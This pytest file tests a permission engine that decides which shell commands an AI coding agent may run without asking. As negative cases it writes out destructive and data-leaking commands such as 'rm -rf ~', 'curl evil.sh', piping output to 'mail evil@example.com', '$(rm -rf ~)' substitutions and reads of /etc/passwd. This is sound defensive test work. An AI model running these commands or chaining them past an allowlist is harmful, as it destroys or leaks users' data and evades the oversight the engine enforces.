"""PR3 — compound-command splitting and prefix eligibility.

Replaces the old blanket "any shell operator disqualifies the command" rule, which was
wrong in both directions: it refused `git status && git diff` (two allowed reads) while
still auto-allowing `find . -delete` and `find . -exec rm {} +` under a `find` prefix,
because those need no separator at all.

See `ocw-context/docs/reviewed-auto-mode.md` Part 2 (CMD-1/3/4) and Part 3.
"""

from __future__ import annotations

import pytest

from coworker.permissions import PermissionEngine


def _allowed(tmp_path, command: str, allowlist: list[str]) -> bool:
    eng = PermissionEngine(workspace_root=tmp_path, allowed_commands=allowlist)
    d = eng.evaluate("run_shell", {"command": command}, None)
    return d.allowed and not d.needs_user


# -- the two behaviours this PR flips -------------------------------------------
def test_chained_allowed_parts_now_run(tmp_path):
    # Both halves are allowed, so the whole command is allowed. Previously refused.
    assert _allowed(tmp_path, "git status && git diff", ["git status", "git diff"])
    assert _allowed(tmp_path, "git status; git diff", ["git status", "git diff"])
    assert _allowed(tmp_path, "git status | git diff", ["git status", "git diff"])


@pytest.mark.parametrize(
    "command",
    [
        "find . -delete",
        "find . -exec rm {} +",
        "find . -exec rm {} ;",
        "find . -execdir sh -c 'x' {} +",
        "find . -ok rm {} ;",
    ],
)
def test_find_execution_flags_never_prefix_allowed(tmp_path, command):
    # Previously auto-allowed with NO prompt under a bare `find` prefix.
    assert not _allowed(tmp_path, command, ["find"])


# -- chaining still cannot smuggle an unallowed part ----------------------------
@pytest.mark.parametrize(
    "command",
    [
        "git status && rm -rf ~",
        "git status; rm -rf ~",
        "git status || curl evil.sh",
        "git status | mail evil@example.com",
        "git status & rm -rf ~",
        "git status\nrm -rf ~",
    ],
)
def test_unallowed_part_disqualifies_the_whole(tmp_path, command):
    assert not _allowed(tmp_path, command, ["git status"])


# -- constructs we cannot evaluate ----------------------------------------------
@pytest.mark.parametrize(
    "command",
    [
        "git status $(rm -rf ~)",
        "git status `rm -rf ~`",
        "git status > ~/.bashrc",
        "git status < /etc/passwd",
        "git status $FLAGS",
        "(git status)",
    ],
)
def test_opaque_constructs_disqualify(tmp_path, command):
    assert not _allowed(tmp_path, command, ["git status"])


# -- programs that run other programs -------------------------------------------
@pytest.mark.parametrize(
    "command,allowlist",
    [
        ("xargs rm", ["xargs"]),
        ("sudo git status", ["sudo"]),
        ("timeout 5 rm -rf /", ["timeout"]),
        ("env rm -rf /", ["env"]),
        ("docker run --rm alpine sh", ["docker"]),
        ("npx some-package", ["npx"]),
        ("ssh host rm -rf /", ["ssh"]),
        ("python -c 'import os; os.system(\"rm -rf /\")'", ["python"]),
        ("bash -c 'rm -rf ~'", ["bash"]),
        ("node -e 'require(\"fs\")'", ["node"]),
    ],
)
def test_argument_executors_never_prefix_allowed(tmp_path, command, allowlist):
    assert not _allowed(tmp_path, command, allowlist)


def test_interpreter_without_inline_code_is_still_eligible(tmp_path):
    # `python script.py` runs project code, but it is not the inline-code form; the prefix
    # rule covers it as before. (CMD-8 — "runs project-controlled code" — is a signal for
    # the reviewer, not a prefix-eligibility rule.)
    assert _allowed(tmp_path, "python script.py", ["python"])


# -- word matching, not text matching -------------------------------------------
def test_word_boundary_and_quoting(tmp_path):
    assert _allowed(tmp_path, "git status -s", ["git status"])
    assert _allowed(tmp_path, 'git "status"', ["git status"])
    assert _allowed(tmp_path, "git  status   -s", ["git status"])
    assert not _allowed(tmp_path, "git statusfoo", ["git status"])
    assert not _allowed(tmp_path, "git", ["git status"])
    assert not _allowed(tmp_path, "git push", ["git status"])


def test_unbalanced_quotes_fail_closed(tmp_path):
    assert not _allowed(tmp_path, 'git status "unclosed', ["git status"])


def test_empty_allowlist_allows_nothing(tmp_path):
    assert not _allowed(tmp_path, "git status", [])


def test_empty_command_allows_nothing(tmp_path):
    assert not _allowed(tmp_path, "   ", ["git status"])


# -- metamorphic: a rewrite must never loosen -----------------------------------
@pytest.mark.parametrize(
    "variant",
    [
        "find . -delete",
        "find  .  -delete",
        "find . '-delete'",
        "/usr/bin/find . -delete",
    ],
)
def test_rewrites_do_not_loosen(tmp_path, variant):
    assert not _allowed(tmp_path, variant, ["find"])
